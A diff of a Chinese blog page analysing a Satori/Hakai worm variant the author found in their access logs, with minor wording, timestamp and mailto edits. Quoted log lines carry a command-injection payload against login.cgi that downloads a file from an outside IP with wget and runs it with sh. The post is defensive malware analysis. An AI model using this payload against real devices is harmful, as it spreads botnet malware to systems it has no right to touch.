@@ -113,7 +113,7 @@
 <meta property="og:image" content="https://www.wzsite.cn/2018/08/06/Satori不愿消退，僵尸网络永不消亡/19-19-03.jpg">
 <meta property="og:image" content="https://www.wzsite.cn/2018/08/06/Satori不愿消退，僵尸网络永不消亡/20-52-08.jpg">
 <meta property="og:image" content="https://www.wzsite.cn/2018/08/06/Satori不愿消退，僵尸网络永不消亡/01-28-19.jpg">
-<meta property="og:updated_time" content="2018-08-07T17:43:15.734Z">
+<meta property="og:updated_time" content="2018-08-18T15:57:35.558Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Satori不愿消退，僵尸网络永不消亡">
 <meta name="twitter:description" content="前言近日，在博客的访问日志上发现一些略显奇特的访问记录，看起来像是远程命令执行，在好奇心(没事干)的驱使下深究下去，然后终于——揭开了，嗯，蠕虫传播的冰山一角。。。(本文标题为360 netlab发表的一篇蠕虫分析文章标题的意译)">
@@ -381,9 +381,9 @@
       
         <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>近日，在博客的访问日志上发现一些略显奇特的访问记录，看起来像是远程命令执行，在好奇心(<del>没事干</del>)的驱使下深究下去，然后终于——揭开了，嗯，蠕虫传播的冰山一角。。。<br>(本文标题为<code>360 netlab</code>发表的一篇蠕虫分析文章标题的意译)<br><a id="more"></a></p>
 <h2 id="访问记录"><a href="#访问记录" class="headerlink" title="访问记录"></a>访问记录</h2><p>笔者喜欢有事没事翻一下博客的访问记录，一来看看除了爬虫还有谁会看我的文章，二来观察爬虫、扫描器以及各种各样的payload的特征，寻找其有意思的地方，说不定以后还能当做自己扫描器的Fuzz路径或者按照思路做一个蜜罐啥的。<br>前几天随便扫一眼日志时，发现了类似命令执行的访问记录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">156.211.122.123 - - [04/Aug/2018:21:50:41 +0800] &quot;GET /login.cgi?cli=aa%20aa%27;wget%20http://46.166.185.42/e%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1&quot; 400 173 &quot;-&quot; &quot;Hakai/2.0&quot;</div><div class="line">41.45.142.236 - - [04/Aug/2018:23:07:02 +0800] &quot;GET /login.cgi?cli=aa%20aa%27;wget%20http://46.166.185.42/e%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1&quot; 400 173 &quot;-&quot; &quot;Hakai/2.0&quot;</div><div class="line">156.219.34.60 - - [06/Aug/2018:01:42:11 +0800] &quot;GET /login.cgi?cli=aa%20aa%27;wget%20http://46.166.185.42/e%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1&quot; 400 173 &quot;-&quot; &quot;Hakai/2.0&quot;</div><div class="line">197.43.118.238 - - [06/Aug/2018:02:10:07 +0800] &quot;GET /login.cgi?cli=aa%20aa%27;wget%20http://46.166.185.42/e%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1&quot; 400 173 &quot;-&quot; &quot;Hakai/2.0&quot;</div></pre></td></tr></table></figure></p>
-<p>看起来就像是带着payload访问一下就能直接下载文件并执行，随后删除掉。<br>访问<code>http://46.166.185.42/e</code></p>
+<p>看起来就像是带着payload访问一下就能直接下载文件并执行。<br>访问<code>http://46.166.185.42/e</code></p>
 <img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/16-09-00.jpg" alt="16-09-00.jpg" title="">
-<p>嗯，赤裸裸的命令执行<br>分别把文件下载下来执行再删除，很熟练的操作<br>很”庆幸“的是，我还能把文件下载下来，之前找过几个类似的，每一个能活到能下载给我分析的，只不过<code>hakai.arm5</code>变<code>404</code>了<br>其余三个文件都是elf文件:<code>hakai.mips</code>、<code>hakai.mpsl</code>、<code>hakai.x86_64</code><br>我分析了其中一个——<code>hakai.x86_64</code>，毕竟从蠕虫作者的角度来想，每个文件的功能都一样是差不多的，只是运行在不同的平台，这样一来就能减少开发以及管理成本，所以分析一个就差不多了</p>
+<p>嗯，赤裸裸的命令执行<br>分别把文件下载下来执行再删除，很熟练的操作<br>很”庆幸“的是，我还能把文件下载下来，之前找过几个类似的，没一个能活到能下载给我分析的，这次只有<code>hakai.arm5</code>变<code>404</code>了<br>其余三个文件都是elf文件:<code>hakai.mips</code>、<code>hakai.mpsl</code>、<code>hakai.x86_64</code><br>我分析了其中一个——<code>hakai.x86_64</code>，毕竟从蠕虫作者的角度来想，每个文件的功能都一样是差不多的，只是运行在不同的平台，这样一来就能减少开发以及管理成本，所以分析一个就差不多了</p>
 <h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>打开IDA，静态分析一下。很庆幸并没有加壳混淆，对本菜十分友好。<br>其中出现的一些payload字符串拿去google一下，发现在今年6月份的时候，360 netlab已经发布了一篇文章——<a href="http://blog.netlab.360.com/botnets-never-die-satori-refuses-to-fade-away-en/" target="_blank" rel="external">Botnets never Die, Satori REFUSES to Fade Away</a>，经过分析，我拿到的样本从加密方式以及行为来看应该是Satori蠕虫的变种，所以本文也应用了这篇文章标题的意译作为标题。<br>先来看一下主函数：<br><img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/15-01-30.jpg" alt="15-01-30.jpg" title=""><br>大概可以看出该蠕虫有以下功能</p>
 <ul>
 <li>修改进程名为<code>sshd</code>或<code>/usr/sbin/dropbear</code>进行隐藏</li>
@@ -588,7 +588,7 @@
                   </span>
                 
                   <span class="links-of-author-item">
-                    <a href="testzero.wz@gmail.com" target="_blank" title="E-Mail">
+                    <a href="mailto:testzero.wz@gmail.com" target="_blank" title="E-Mail">
                       
                         <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                   </span>
